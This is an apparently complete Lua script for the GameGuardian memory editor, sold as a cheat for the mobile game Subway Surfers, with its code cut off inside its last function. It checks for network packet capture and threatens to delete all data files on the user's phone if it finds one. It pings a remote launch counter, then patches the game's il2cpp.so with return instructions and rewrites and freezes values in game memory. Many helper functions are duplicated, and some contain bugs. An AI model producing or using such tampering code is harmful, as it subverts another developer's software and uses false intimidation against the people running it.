
gg.alert("正在检测环境，请稍等.....")
if gg.isHTTPdump() == false then
	gg.alert("环境正常，正在开启脚本")
end
if gg.isHTTPdump() == true then
	gg.alert("环境异常，检测到你使用了抓包，请您在3秒内关闭或者退出此脚本，否则面临删除您真机中所有data格式文件")
	os.exit()--退出脚本--有退出修改器函数就用这个--gg.ggExit()
end
if gg.isHTTPdump() == "error" then
	gg.alert("请检查网络是否良好")
end
gg.alert("正在二次检测环境，请稍等.....")
if gg.isHTTPdump() == false then
	gg.alert("环境正常，正在开启脚本")
end
if gg.isHTTPdump() == true then
	gg.alert("环境异常，检测到你使用了抓包，请您在3秒内关闭或者退出此脚本，否则面临删除您真机中所有data格式文件")
	os.exit()--退出脚本--有退出修改器函数就用这个--gg.ggExit()
end
if gg.isHTTPdump() == "error" then
	gg.alert("请检查网络是否良好")
end
gg.alert("开启成功正在连接脚本")
gg.playMusic('http://music.163.com/song/media/outer/url?id=17075871.mp3')


local ll=gg.makeRequest("http://wss.wigwy.xyz/api/numberOf/7728513846230904").content--启动次数配置


draw.setSize(35)
draw.setStyle('描边并填充')

draw3 = require('draw3')
text1 = draw3.text('QF全防UI', 5, 980)
local color = 0xff0a0ef6
text1.setColor(color)


draw3 = require('draw3')
text1 = draw3.text('Q群:528904405<群满看群资料>', 5, 940)
local color = 0xff0a0ef6
text1.setColor(color)

draw3 = require('draw3')
text1 = draw3.text('地铁跑酷4.06.0牛津版', 5, 1020)
local color = 0xff0a0ef6
text1.setColor(color)


draw3 = require('draw3')
text1 = draw3.text('QF全防', 5, 1060)
local color = 0xff0a0ef6
text1.setColor(color)

draw3 = require('draw3')
text1 = draw3.text('注:此脚本纯属公益', 5, 1100)
local color = 0xff0a0ef6
text1.setColor(color)

draw3 = require('draw3')
text1 = draw3.text('QF全防UI启动次数'..ll..'', 5, 1140)
local color = 0xff0a0ef6
text1.setColor(color)

qmnb = function(daarr)
local array = {}
for i = 1, #daarr["搜索数组"] do
local data = {["lv"] =daarr["搜索数组"][i][1], ["offset"] = daarr["搜索数组"][i][2], ["type"] = daarr["搜索类型"]}
table.insert(array, i, data)
end
local isok, data = app.memorysearch(daarr["搜索内存"], array)
if isok then
for i = 1, #data do
for x = 1, #daarr["修改数组"] do
app.memorywrite(data[i] + daarr["修改数组"][x][2], daarr["搜索类型"], daarr["修改数组"][x][1])
end
end
gg.toast(daarr["功能"] .. "共修改" .. #data * #daarr["修改数组"] .. "条数据")
else
gg.toast(daarr["功"] .. "开启失败")
end
end
function ByQF(FUNCTIONADD,TYPE,VALUE)
local SOMOD=gg.getRangesList("il2cpp.so")
if SOMOD[1]==nil then _error() else
gg.setValues({{address=SOMOD[1].start+FUNCTIONADD,flags=TYPE,value=VALUE}})
gg.setValues({{address=SOMOD[1].start+FUNCTIONADD+4,flags=TYPE,value="1EFF2FE1r"}})
end
end



function xg1(value,lx,py,dj) if sj~=nil and #sj>0 then z={} for i=1,#sj do z[i]={} z[i].address=sj[i].address+py z[i].flags=lx if value == nil then value = readValue(z[i].address, lx) end z[i].value= value z[i].freeze = dj and true or false end if dj == true or dj == false then gg.addListItems(z) else gg.setValues(z) end gg.toast('') else gg.toast('') end end
function xg2(bz,value,lx,py,dj)  if #bz~=nil then  z={}  for i=1,#bz do  z[i]={}  z[i].address=bz[i].address+py  z[i].flags=lx  z[i].value=value  if dj==true then z[i].freeze=true end  end  if dj==true then  gg.addListItems(z)  else  gg.clearList()  gg.setValues(z)  end  gg.toast('')  else  gg.toast('')  end  end  function bc(bz)  if sj~=nil then  _ENV[bz]=sj  else  gg.toast('')  end  end  


Qr_UIP2FazG='Main'
gg.clearResults() sj={} xgz={} gg.toast("神威天天开心一路长虹，官方群497773155") function search(ss,lx,nc,dz1,dz2) if ss~=nil then if lx~=nil then if nc==nil then nc=32 end gg.setRanges(nc) if dz1==nil then dz1="-1" end if dz2==nil then dz1="0" end gg.searchNumber(ss,lx,false,gg.SIGN_EQUAL,dz1,dz2) sl=gg.getResultCount() if sl~=0 then sj=gg.getResults(sl) gg.toast("搜索到 "..sl.." 个结果") gg.clearResults() else gg.toast("未搜索到结果") end else gg.toast("无搜索值类型") end else gg.toast("无需搜索值") end end function py1(value,lx,py) if #sj~=nil then z1={} z2={} for i=1,#sj do z1[i]={} z1[i].address=sj[i].address+py z1[i].flags=lx end z1=gg.getValues(z1) for i=1,#sj do if z1[i].value==value then z2[#z2+1]={} z2[#z2]=sj[i] end end sj=z2 z1={} z2={} gg.toast("共偏移 "..#sj.." 个数据") else gg.toast("没有搜索数据") end end function py2(value,lx,py) if #sj~=nil then z1={} z2={} for i=1,#sj do z1[i]={} z1[i].address=sj[i].address+py z1[i].flags=lx end z1=gg.getValues(z1) for i=1,#sj do if z1[i].value~=value then z2[#z2+1]={} z2[#z2]=sj[i] end end sj=z2 z1={} z2={} gg.toast("共偏移 "..#sj.." 个数据") else gg.toast("没有搜索数据") end end function xg1(value,lx,py,dj) if #sj~=nil then z={} for i=1,#sj do z[i]={} z[i].address=sj[i].address+py z[i].flags=lx z[i].value=value if dj==true then z[i].freeze=true end end if dj==true then gg.addListItems(z) else gg.clearList() gg.setValues(z) end gg.toast("共修改 "..#z.." 个数据") else gg.toast("没有搜索数据") end end function xg2(bz,value,lx,py,dj) if #bz~=nil then z={} for i=1,#bz do z[i]={} z[i].address=bz[i].address+py z[i].flags=lx z[i].value=value if dj==true then z[i].freeze=true end end if dj==true then gg.addListItems(z) else gg.clearList() gg.setValues(z) end gg.toast("共修改 "..#z.." 个数据") else gg.toast("没有搜索数据") end end function bc(bz) if sj~=nil then _ENV[bz]=sj else gg.toast("无数据") end end function BaAdd(add) if gg.getTargetInfo().x64==true then t=gg.getValues({[1]={address=add,flags=32}}) return t[1].value else t=gg.getValues({[1]={address=add,flags=4}}) return t[1].value&0xFFFFFFFF end end function set(dz,xg,lx,dj) if dj=="true" then gg.addListItems({{address=dz,flags=lx,value=xg,freeze=true}}) else gg.setValues({{address=dz,flags=lx,value=xg}}) end gg.toast("已修改完成~") end



wt = function ( Address , Value )
	local Somod = gg.getRangesList ( 'il2cpp.so' ) [ 1 ]
	if Somod == nil then
		gg.alert ( '请重新选择地铁跑酷进程' )
	else
		local So = Somod.start
		local Add = So + Address
		gg.processPause ( )
		gg.setValues ( { { address = Add , flags = 4 , value = Value } } )
		gg.setValues ( { { address = Add + 4 , flags = 4 , value = "~A BX	 LR" } } )
		gg.processResume ( )
	end
end

function Fs3Fs4(Fs1, Fs2, Fs3, Fs4, Fs5) gg.clearResults() gg.setRanges(Fs2) gg.setVisible(false) gg.searchNumber(Fs3[1][1], Fs3[1][3]) local count = gg.getResultCount() local result = gg.getResults(count) gg.clearResults() local data = {} local base = Fs3[1][2] if (count > 0) then for i, v in ipairs(result) do v.isUseful = true end for k=2, #Fs3 do local tmp = {} local offset = Fs3[k][2] - base local num = Fs3[k][1] for i, v in ipairs(result) do tmp[#tmp+1] = {} tmp[#tmp].address = v.address + offset tmp[#tmp].flags = Fs3[k][3] end tmp = gg.getValues(tmp) for i, v in ipairs(tmp) do if ( tostring(v.value) ~= tostring(num) ) then result[i].isUseful = false end end end for i, v in ipairs(result) do if (v.isUseful) then data[#data+1] = v.address end end if (#data > 0) then gg.toast(Fs1..'\n搜索到{'..#data..'}条数据') local t = {} local base = Fs3[1][2] if Fs5 == '' and Fs5 > 0 and Fs5 < #data then Fs5 = Fs5 else Fs5 = #data end for i=1, Fs5 do for k, w in ipairs(Fs4) do offset = w[2] - base t[#t+1] = {} t[#t].address = data[i] + offset t[#t].flags = w[3] t[#t].value = w[1] if (w[4] == true) then local item = {} item[#item+1] = t[#t] item[#item].freeze = true gg.addListItems(item) end end end gg.setValues(t) gg.toast(Fs1..'️\n已修改{'..#t..'}条数据') else gg.toast(Fs1..'\n数据搜索失败', false) return false end else gg.toast(Fs1..'\n数据修改失败', false) return false end end

function search(ss,lx,nc,dz1,dz2) if ss~=nil then if lx~=nil then if nc==nil then nc=32 end gg.setRanges(nc) if dz1==nil then dz1="-1" end if dz2==nil then dz1="0" end gg.searchNumber(ss,lx,false,536870912,dz1,dz2) sl=gg.getResultCount() if sl~=0 then sj=gg.getResults(sl) gg.toast("搜索到 "..sl.." 个结果") gg.clearResults() else gg.toast("未搜索到结果") end else gg.toast("无搜索值类型") end else gg.toast("无需搜索值") end end function py1(value,lx,py) if #sj~=nil then z1={} z2={} for i=1,#sj do z1[i]={} z1[i].address=sj[i].address+py z1[i].flags=lx end z1=gg.getValues(z1) for i=1,#sj do if z1[i].value==value then z2[#z2+1]={} z2[#z2]=sj[i] end end sj=z2 z1={} z2={} gg.toast("共偏移 "..#sj.." 个数据") else gg.toast("没有搜索数据") end end function py2(value,lx,py) if #sj~=nil then z1={} z2={} for i=1,#sj do z1[i]={} z1[i].address=sj[i].address+py z1[i].flags=lx end z1=gg.getValues(z1) for i=1,#sj do if z1[i].value~=value then z2[#z2+1]={} z2[#z2]=sj[i] end end sj=z2 z1={} z2={} gg.toast("共偏移 "..#sj.." 个数据") else gg.toast("没有搜索数据") end end 
function xg1(value,lx,py,dj) if #sj~=nil then z={} for i=1,#sj do z[i]={} z[i].address=sj[i].address+py z[i].flags=lx z[i].value=value if dj==true then z[i].freeze=true end end if dj==true then gg.addListItems(z) else gg.clearList() gg.setValues(z) end gg.toast("共修改 "..#z.." 个数据") else gg.toast("没有搜索数据") end end 
function xg2(bz,value,lx,py,dj) if #bz~=nil then z={} for i=1,#bz do z[i]={} z[i].address=bz[i].address+py z[i].flags=lx z[i].value=value if dj==true then z[i].freeze=true end end if dj==true then gg.addListItems(z) else gg.clearList() gg.setValues(z) end gg.toast("共修改 "..#z.." 个数据") else gg.toast("没有搜索数据") end end function bc(bz) if sj~=nil then _ENV[bz]=sj else gg.toast("无数据") end end function BaAdd(add) t=gg.getValues({[1]={address=add,flags=4}}) return t[1].value&0xFFFFFFFF end function set(dz,xg,lx,dj) if dj=="true" then gg.addListItems({{address=dz,flags=lx,value=xg,freeze=true}}) else gg.setValues({{address=dz,flags=lx,value=xg}}) end gg.toast("已修改完成~") end

function readValue(address, flags) return gg.getValues({{address = address, flags = flags}})[1]["value"]end
 ms = { }
function setvalue ( add , value , falgs , dj )
	local WY = { } WY [ 1 ] = { } WY [ 1 ].address = add WY [ 1 ].value = value WY [ 1 ].flags = falgs
	if dj == true then
		WY [ 1 ].freeze = true gg.addListItems ( WY )
	else
		gg.setValues ( WY )
	end
end
function ms.ss ( num , ty , nc )
	local GGNUMBER_1 = num
	local GGNUMBER_2 = ty
	local GGNUMBER_3 = false
	local GGNUMBER_4 = gg.SIGN_EQUAL
	local GGNUMBER_5 = 0x3000000
	local GGNUMBER_6 = 0xFFFFFFFF
	local GGNUMBER_7 = 0
	gg.clearResults ( )
	gg.setRanges ( nc )
	gg.searchNumber ( GGNUMBER_1 , GGNUMBER_2 , GGNUMBER_3 , GGNUMBER_4 , GGNUMBER_5 , GGNUMBER_6 , GGNUMBER_7 )
	Result = gg.getResults ( gg.getResultCount ( ) )
end

function ms.py ( num , py , ty )
	if ( Result and # Result ~= 0 ) then
		t = { }
		for i , v in ipairs ( Result ) do
			t [ i ] = { } t [ i ].address = v.address + py t [ i ].flags = ty
		end
		t = gg.getValues ( t )
		for i , v in ipairs ( t ) do
			if v.value ~= num then
				Result [ i ] = nil
			end
		end
		local MS = { }
		for i , v in pairs ( Result ) do
			MS [ # MS + 1 ] = v
		end
		Result = MS
	end
end

function ms.bc ( )
	data = { }
	if Result == nil or # Result == 0 then
		gg.alert ( "开启失败" )
	else
		for i , v in pairs ( Result ) do
			data [ # data + 1 ] = v.address
		end
	end
	Result = nil
end

function ms.edit ( nn , off , ty , dj )
	if ( Result ) then
		ms.bc ( )
	end
	if # data > 0 then
		for i , v in ipairs ( data ) do
			setvalue ( v + off , nn , ty , dj or false )
		end
		gg.toast ( Name.."成功" )
	end
end

function Get_Search(fname)
local function getRanges()
	local ranges = {}
	local t = gg.getRangesList('^/data/*.so*$')
	for i, v in pairs(t) do
		if v.type:sub(2, 2) == 'w' then
			table.insert(ranges, v)
		end
	end
	return ranges
end
fname=fname or {}
local m=getRanges()
local many={}
if "table"==type(fname) then--首信息1
    for i in pairs(m) do
        local p=m[i].internalName:match("^.*/(.+)")
        if p==fname[1] and m[i].state==fname[2] then
            many={state=m[i].state,start=m[i].start}
            break
        end
    end
elseif "string"==type(fname) then
    if "slow"==fname then--全信息
        for i=1,#m do
            local p=m[i].internalName:match("^.*/(.+)")
            many[i]={name=p,state=m[i].state,start=m[i].start}
        end
    elseif "quick"==fname then--尾信息
        for i=1,#m do
            local p=m[i].internalName:match("^.*/(.+)")
            many[p]={state=m[i].state,start=m[i].start}
        end
    else
        for i=1,#m do--首信息2
            local p=m[i].internalName:match("^.*/(.+)")
            if p==fname then
                many={state=m[i].state,start=m[i].start}
                break
            end
        end
        if AddrInfoLen(many)~=2 then
            return false
        end
    end
else
    error("填写'quick'或者'slow'或者文件名或者{文件名,状态}")
end
return many
end
function Get_Address(Head,Offset,Flag)
    local tinfom=gg.getTargetInfo()
    Flag=Flag or 32
    local t={}
    local Addr
    if Head then
        t[1]={address=Head+Offset[1],flags=Flag}
        if not (#Offset==1) then
            for i=2,#Offset do
                local place=gg.getValues(t)
                t={}
                if not tinfom.x64 then
                    place[1].value=place[1].value & 0xFFFFFFFF
                end
                t[1]={address=place[1].value+Offset[i],flags=Flag}
            end
        end
        Addr=t[1].address
    end
    return string.format("0x%X",Addr)
end

function SearchWrite(Search, Write, Type) 
gg.clearResults() 
gg.setVisible(false) 
gg.searchNumber(Search[1][1], Type) 
local count = gg.getResultCount() 
local result = gg.getResults(count) 
gg.clearResults() 
local data = {} 
local base = Search[1][2] 
if (count > 0) then 
for i, v in ipairs(result) do 
v.isUseful = true 
end 
for k=2, #Search do 
local tmp = {} 
local offset = Search[k][2] - base 
local num = Search[k][1] 
for i, v in ipairs(result) do 
tmp[#tmp+1] = {} 
tmp[#tmp].address = v.address + offset 
tmp[#tmp].flags = v.flags 
end 
tmp = gg.getValues(tmp) 
for i, v in ipairs(tmp) do 
if ( tostring(v.value) ~= tostring(num) ) then 
result[i].isUseful = false 
end 
end 
end 
for i, v in ipairs(result) do 
if (v.isUseful) then 
data[#data+1] = v.address 
end 
end 
if (#data > 0) then 
local t = {} 
local base = Search[1][2] 
for i=1, #data do 
for k, w in ipairs(Write) do 
offset = w[2] - base 
t[#t+1] = {} 
t[#t].address = data[i] + offset 
t[#t].flags = Type 
t[#t].value = w[1] 
if (w[3] == true) then 
local item = {} 
item[#item+1] = t[#t] 
item[#item].freeze = true 
gg.addListItems(item) 
end 
end 
end 
gg.setValues(t) 
else 
return false 
end 
else 
return false 
end
end

JFYx32 = function ( Address , Value )
	local Somod = gg.getRangesList ( 'il2cpp.so' ) [ 1 ]
	if Somod == nil then
		gg.alert ( '请重新选择地铁跑酷进程' )
	else
		local So = Somod.start
		local Add = So + Address
		gg.processPause ( )
		gg.setValues ( { { address = Add , flags = 4 , value = Value } } )
		gg.setValues ( { { address = Add + 4 , flags = 4 , value = "~A BX	 LR" } } )
		gg.processResume ( )
	end
end

function readPointer(name, offset, i)
	local re = gg.getRangesList(name)
	local x64 = gg.getTargetInfo().x64
	local va = {[true] = 32, [false] = 4}
	if re[i or 1] then
		local addr = re[i or 1].start + offset[1]
		for i = 2, #offset do
			addr = gg.getValues({{address = addr, flags = va[x64]}})
			if not x64 then
				addr[1].value = addr[1].value & 0xFFFFFFFF
			end
			addr = addr[1].value + offset[i]
		end
		return addr
	end
end

function gg.edits(addr, Table, name)
	local Table1 = {{}, {}}
	for k, v in ipairs(Table) do
		local value = {address = addr + v[3], value = v[1], flags = v[2], freeze = v[4]}
		if v[4] then
			Table1[2][#Table1[2] + 1] = value
		else
			Table1[1][#Table1[1] + 1] = value
		end
	end
	gg.addListItems(Table1[2])
	gg.setValues(Table1[1])
end
local json = json
ms = { }
function setvalue ( add , value , falgs)
qx={} qx[#qx+1]={} qx[#qx].value=value qx[#qx].flags=falgs  qx[#qx].freeze=true qx[#qx].address=add gg.addListItems (qx)
end

il2cpp_so_x32 = function ( Address , Value )
	local Somod = gg.getRangesList ( 'il2cpp.so' ) [ 1 ]
	if Somod == nil then
		gg.alert ( '请重新选择地铁跑酷进程' )
	else
		local So = Somod.start
		local Add = So + Address
		gg.processPause ( )
		gg.setValues ( { { address = Add , flags = 4 , value = Value } } )
		gg.setValues ( { { address = Add + 4 , flags = 4 , value = "~A BX	 LR" } } )
		gg.processResume ( )
	end
end

ms = { }
function setvalue ( add , value , falgs , dj )
	local WY = { } WY [ 1 ] = { } WY [ 1 ].address = add WY [ 1 ].value = value WY [ 1 ].flags = falgs
	if dj == true then
		WY [ 1 ].freeze = true gg.addListItems ( WY )
	else
		gg.setValues ( WY )
	end
end

function ms.ss ( num , ty , nc )
	local GGNUMBER_1 = num
	local GGNUMBER_2 = ty
	local GGNUMBER_3 = false
	local GGNUMBER_4 = gg.SIGN_EQUAL
	local GGNUMBER_5 = 0x3000000
	local GGNUMBER_6 = 0xFFFFFFFF
	local GGNUMBER_7 = 0
	gg.clearResults ( )
	gg.setRanges ( nc )
	gg.searchNumber ( GGNUMBER_1 , GGNUMBER_2 , GGNUMBER_3 , GGNUMBER_4 , GGNUMBER_5 , GGNUMBER_6 , GGNUMBER_7 )
	Result = gg.getResults ( gg.getResultCount ( ) )
end

function ms.py ( num , py , ty )
	if ( Result and # Result ~= 0 ) then
		t = { }
		for i , v in ipairs ( Result ) do
			t [ i ] = { } t [ i ].address = v.address + py t [ i ].flags = ty
		end
		t = gg.getValues ( t )
		for i , v in ipairs ( t ) do
			if v.value ~= num then
				Result [ i ] = nil
			end
		end
		local MS = { }
		for i , v in pairs ( Result ) do
			MS [ # MS + 1 ] = v
		end
		Result = MS
	end
end

function ms.bc ( )
	data = { }
	if Result == nil or # Result == 0 then
		gg.alert ( "开启失败" )
	else
		for i , v in pairs ( Result ) do
			data [ # data + 1 ] = v.address
		end
	end
	Result = nil
end

function ms.edit ( nn , off , ty , dj )
	if ( Result ) then
		ms.bc ( )
	end
	if # data > 0 then
		for i , v in ipairs ( data ) do
			setvalue ( v + off , nn , ty , dj or false )
		end
		gg.toast ( Name.."成功" )
	end
end

function py1(value,lx,py) gg.setVisible(false) if #sj~=nil then  z1={} z2={}  for i=1,#sj do  z1[1]={}  z1[1].address=sj[i].address+py  z1[1].flags=lx  z1=gg.getValues(z1)  if z1[1].value==value then  z2[#z2+1]={}  z2[#z2]=sj[i]  end end  sj=z2  z1={} z2={}  gg.toast("偏移了 "..#sj.." 个数据")  else  gg.toast("没有搜索数据")  end  end

function S_Pointer(t_So, t_Offset, _bit)
	local function getRanges()
		local ranges = {}
		local t = gg.getRangesList('^/data/*.so*$')
		for i, v in pairs(t) do
			if v.type:sub(2, 2) == 'w' then
				table.insert(ranges, v)
			end
		end
		return ranges
	end
	local function Get_Address(N_So, Offset, ti_bit)
		local ti = gg.getTargetInfo()
		local S_list = getRanges()
		local t = {}
		local _t
		local _S = nil
		if ti_bit then
			_t = 32
		else
			_t = 4
		end
		for i in pairs(S_list) do
			local _N = S_list[i].internalName:gsub('^.*/', '')
			if N_So[1] == _N and N_So[2] == S_list[i].state then
				_S = S_list[i]
				break
			end
		end
		if _S then
			t[#t + 1] = {}
			t[#t].address = _S.start + Offset[1]
			t[#t].flags = _t
			if #Offset ~= 1 then
				for i = 2, #Offset do
					local S = gg.getValues(t)
					t = {}
					for _ in pairs(S) do
						if not ti.x64 then
							S[_].value = S[_].value & 0xFFFFFFFF
						end
						t[#t + 1] = {}
						t[#t].address = S[_].value + Offset[i]
						t[#t].flags = _t
					end
				end
			end
			_S = t[#t].address
		end
		return _S
	end
	local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit))
	return _A
end

function SearchWrite(Search, Write, Type, Name)
    local time=os.clock()
    gg.clearResults()
    gg.setVisible(false)
    gg.searchNumber(Search[1][1], Type)
    local count = gg.getResultCount()
    local result = gg.getResults(count)
    gg.clearResults()
    local data = {}
    local base = Search[1][2] 
   if (count > 0) then
        for i, v in ipairs(result) do
            v.isUseful = true
        end
        for k=2, #Search do
            local tmp = {}
            local offset = Search[k][2] - base
            local num = Search[k][1]          
            for i, v in ipairs(result) do
                tmp[#tmp+1] = {}
                tmp[#tmp].address = v.address + offset
                tmp[#tmp].flags = v.flags
            end 
            tmp = gg.getValues(tmp)
            for i, v in ipairs(tmp) do
                if ( tostring(v.value) ~= tostring(num) ) then
                    result[i].isUseful = false
                end
            end
        end
  
        for i, v in ipairs(result) do
            if (v.isUseful) then
                data[#data+1] = v.address
            end
        end
        if (#data > 0) then
           gg.toast("搜索到"..#data.."条数据")
           local t = {}
           local base = Search[1][2]
           for i=1, #data do
               for k, w in ipairs(Write) do
                   offset = w[2] - base
                   t[#t+1] = {}
                   t[#t].address = data[i] + offset
                   t[#t].flags = Type
                   t[#t].value = w[1]
                   if (w[3] == true) then
                       local item = {}
                       item[#item+1] = t[#t]
                       item[#item].freeze = true
                       gg.addListItems(item)
                   end
               end
           end
           gg.setValues(t)
           local time=string.sub(os.clock()-time,0,5)
          gg.toast("开启成功 已修改:"..#t.."条数据 本次启动耗时:"..time.."秒")
          gg.addListItems(t)
        else
            gg.toast("开启失败未搜索到任何数据", false)
            return false
        end
    else
        gg.toast("开启失败未搜索到任何数据")
        return false
    end
end 

function WT(FUNCTIONADD,TYPE,VALUE)
local SOMOD=gg.getRangesList("il2cpp.so")
if SOMOD[1]==nil then _error() else
gg.setValues({{address=SOMOD[1].start+FUNCTIONADD,flags=TYPE,value=VALUE}})
gg.setValues({{address=SOMOD[1].start+FUNCTIONADD+4,flags=TYPE,value="1EFF2FE1r"}})
end
end

function SearchWrite(Search, Write, Type) 
gg.clearResults() 
gg.setVisible(false) 
gg.searchNumber(Search[1][1], Type) 
local count = gg.getResultCount() 
local result = gg.getResults(count) 
gg.clearResults() 
local data = {} 
local base = Search[1][2] 
if (count > 0) then 
for i, v in ipairs(result) do 
v.isUseful = true 
end 
for k=2, #Search do 
local tmp = {} 
local offset = Search[k][2] - base 
local num = Search[k][1] 
for i, v in ipairs(result) do 
tmp[#tmp+1] = {} 
tmp[#tmp].address = v.address + offset 
tmp[#tmp].flags = v.flags 
end 
tmp = gg.getValues(tmp) 
for i, v in ipairs(tmp) do 
if ( tostring(v.value) ~= tostring(num) ) then 
result[i].isUseful = false 
end 
end 
end 
for i, v in ipairs(result) do 
if (v.isUseful) then 
data[#data+1] = v.address 
end 
end 
if (#data > 0) then 
local t = {} 
local base = Search[1][2] 
for i=1, #data do 
for k, w in ipairs(Write) do 
offset = w[2] - base 
t[#t+1] = {} 
t[#t].address = data[i] + offset 
t[#t].flags = Type 
t[#t].value = w[1] 
if (w[3] == true) then 
local item = {} 
item[#item+1] = t[#t] 
item[#item].freeze = true 
gg.addListItems(item) 
end 
end 
end 
gg.setValues(t) 
else 
return false 
end 
else 
return false 
end 
end

 j={}
xgz={}
ZY='Main'
gg.toast('欢迎使用科技')
gg.clearResults()  sj={}  xgz={} gg.toast("?欢迎进入?")  function search(ss,lx,nc,dz1,dz2)  if ss~=nil then if lx~=nil then  if nc==nil then nc=32 end  gg.setRanges(nc)  if dz1==nil then dz1="-1" end  if dz2==nil then dz1="0" end  gg.searchNumber(ss,lx,false,gg.SIGN_EQUAL,dz1,dz2)  sl=gg.getResultCount()  if sl~=0 then  sj=gg.getResults(sl)  gg.toast("??搜索到 "..sl.." 个结果??")  gg.clearResults()  else  gg.toast("?未搜索到结果?")  end  else  gg.toast("?无搜索值类型?")  end  else  gg.toast("?无需搜索值?")  end  end  function py1(value,lx,py)  if #sj~=nil then  z1={} z2={}  for i=1,#sj do  z1[1]={}  z1[1].address=sj[i].address+py  z1[1].flags=lx  z1=gg.getValues(z1)  if z1[1].value==value then  z2[#z2+1]={}  z2[#z2]=sj[i]  end end  sj=z2  z1={} z2={}  gg.toast("?共偏移 "..#sj.." 个数据?")  else  gg.toast("?没有搜索数据?")  end  end  function py2(value,lx,py)  if #sj~=nil then  z1={} z2={}  for i=1,#sj do  z1[1]={}  z1[1].address=sj[i].address+py  z1[1].flags=lx  z1=gg.getValues(z1)  if z1[1].value~=value then  z2[#z2+1]={}  z2[#z2]=sj[i]  end end  sj=z2  z1={} z2={}  gg.toast("?共偏移 "..#sj.." 个数据?")  else  gg.toast("?没有搜索数据?")  end  end  function xg1(value,lx,py,dj)  if #sj~=nil then  z={}  for i=1,#sj do  z[i]={}  z[i].address=sj[i].address+py  z[i].flags=lx  z[i].value=value  if dj==true then z[i].freeze=true end  end  if dj==true then  gg.addListItems(z)  else  gg.clearList()  gg.setValues(z)  end  gg.toast("??共修改 "..#z.." 个数据??")  else  gg.toast("?没有搜索数据?")  end  end  function xg2(bz,value,lx,py,dj)  if #bz~=nil then  z={}  for i=1,#bz do  z[i]={}  z[i].address=bz[i].address+py  z[i].flags=lx  z[i].value=value  if dj==true then z[i].freeze=true end  end  if dj==true then  gg.addListItems(z)  else  gg.clearList()  gg.setValues(z)  end  gg.toast("??共修改 "..#z.." 个数据??")  else  gg.toast("??没有搜索数据??")  end  end  function bc(bz)  if sj~=nil then  _ENV[bz]=sj  else  gg.toast("?无数据?")  end
end

function search(ss,lx,nc,dz1,dz2)  gg.setVisible(false) if ss~=nil then if lx~=nil then if nc==nil then nc=32 end gg.setRanges(nc) if dz1==nil then dz1="-1" end if dz2==nil then dz1="0" end gg.searchNumber(ss,lx,false,536870912,dz1,dz2) sl=gg.getResultCount() if sl~=0 then sj=gg.getResults(sl) gg.toast("搜索到 "..sl.." 个结果") gg.clearResults() else gg.toast("未搜索到结果") end else gg.toast("无搜索值类型") end else gg.toast("无需搜索值") end end function py1(value,lx,py) if #sj~=nil then z1={} z2={} for i=1,#sj do z1[i]={} z1[i].address=sj[i].address+py z1[i].flags=lx end z1=gg.getValues(z1) for i=1,#sj do if z1[i].value==value then z2[#z2+1]={} z2[#z2]=sj[i] end end sj=z2 z1={} z2={} gg.toast("共偏移 "..#sj.." 个数据") else gg.toast("没有搜索数据") end end function py2(value,lx,py) if #sj~=nil then z1={} z2={} for i=1,#sj do z1[i]={} z1[i].address=sj[i].address+py z1[i].flags=lx end z1=gg.getValues(z1) for i=1,#sj do if z1[i].value~=value then z2[#z2+1]={} z2[#z2]=sj[i] end end sj=z2 z1={} z2={} gg.toast("共偏移 "..#sj.." 个数据") else gg.toast("没有搜索数据") end end function py2(value,lx,py) if #sj~=nil then z1={} z2={} for i=1,#sj do z1[i]={} z1[i].address=sj[i].address+py z1[i].flags=lx end z1=gg.getValues(z1) for i=1,#sj do if z1[i].value~=value then z2[#z2+1]={} z2[#z2]=sj[i] end end sj=z2 z1={} z2={} gg.toast("共偏移 "..#sj.." 个数据") else gg.toast("没有搜索数据") end end function xg1(value,lx,py,dj) if #sj~=nil then z={} for i=1,#sj do z[i]={} z[i].address=sj[i].address+py z[i].flags=lx z[i].value=value if dj==true then z[i].freeze=true end end if dj==true then gg.addListItems(z) else gg.clearList() gg.setValues(z) end gg.toast("共修改 "..#z.." 个数据") else gg.toast("没有搜索数据") end end


function editData(qmnb,qmxg)gg.setVisible(false)gg.clearResults()qmnbv=qmnb[3]["value"]or qmnb[3][1]qmnbt=qmnb[3]["type"]or qmnb[3][2]qmnbn=qmnb[2]["name"]or qmnb[2][1]gg.setRanges(qmnb[1]["memory"]or qmnb[1][1])gg.searchNumber(qmnbv,qmnbt)gg.refineNumber(qmnbv,qmnbt)sz=gg.getResultCount()if sz==0 then gg.toast(qmnbn.."开启失败")else sl=gg.getResults(999999)for i=1,sz do pdsz=true for v=4,#qmnb do if pdsz==true then pysz={{}}pysz[1].address=sl[i].address+(qmnb[v]["offset"]or qmnb[v][2])pysz[1].flags=qmnb[v]["type"]or qmnb[v][3]szpy=gg.getValues(pysz)tzszpd=tostring(qmnb[v]["lv"]or qmnb[v][1]):gsub(",","")pyszpd=tostring(szpy[1].value):gsub(",","")if tzszpd==pyszpd then pdjg=true pdsz=true else pdjg=false pdsz=false end end end if pdjg==true then szpy=sl[i].address for x=1,#qmxg do xgsz=qmxg[x]["value"]or qmxg[x][1]xgpy=szpy+(qmxg[x]["offset"]or qmxg[x][2])xglx=qmxg[x]["type"]or qmxg[x][3]xgdj=qmxg[x]["freeze"]or qmxg[x][4]xg={{address=xgpy,flags=xglx,value=xgsz}}if xgdj==true then xg[1].freeze=xgdj gg.addListItems(xg)else gg.setValues(xg)end end xgjg=true end end if xgjg==true then gg.toast(qmnbn.."开启成功")else gg.toast(qmnbn.."开启失败")end end end
 
function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]["memory"]) if gg.searchNumber(qmnb[3]["value"],qmnb[3]["type"],false,gg.SIGN_EQUAL,0,-1)~=true then gg.searchAddress(qmnb[3]["value"],-1,qmnb[3]["type"]) end if gg.getResultCount()==0 then gg.toast(qmnb[2]["name"].."开启失败")return end szxx=gg.getResults(gg.getResultCount()) szpd={} a=0 for i=4,#qmnb do for s=1,#szxx do if szpd[s]~="false" then if gg.getValues({{address=szxx[s].address+qmnb[i]["offset"],flags=qmnb[i]["type"]}})[1].value+0~=qmnb[i]["lv"]then szpd[s]="false" a=a+1 end end end end if a==#szxx then gg.toast(qmnb[2]["name"].."开启失败")return end b=0 t={} for x=1,#qmxg do if qmxg[x]["freeze"]==true then a=1 end for i=1,#szxx do if szpd[i]==nil then b=b+1 table.insert(t,{address=szxx[i].address+qmxg[x]["offset"],flags=qmxg[x]["type"],freeze=qmxg[x]["freeze"],value=qmxg[x]["value"]}) end end end gg.setValues(t) gg.addListItems(t) gg.clearResults() if a~=1 then gg.clearList()else a=nil end 